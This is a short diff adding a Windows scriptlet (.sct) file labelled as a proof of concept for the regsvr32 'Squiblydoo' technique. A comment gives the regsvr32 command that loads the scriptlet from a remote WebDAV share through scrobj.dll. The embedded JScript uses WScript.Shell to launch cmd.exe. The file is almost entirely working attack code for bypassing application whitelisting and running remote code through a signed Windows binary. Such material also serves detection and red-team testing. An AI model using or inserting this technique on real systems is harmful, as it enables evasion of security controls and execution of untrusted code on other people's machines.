@@ -1,0 +1,13 @@
+<?XML version="1.0"?>
+<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
+<scriptlet>
+<registration
+    progid="PoC"
+    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
+    <script language="JScript">
+        <![CDATA[
+            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+        ]]>
+</script>
+</registration>
+</scriptlet>
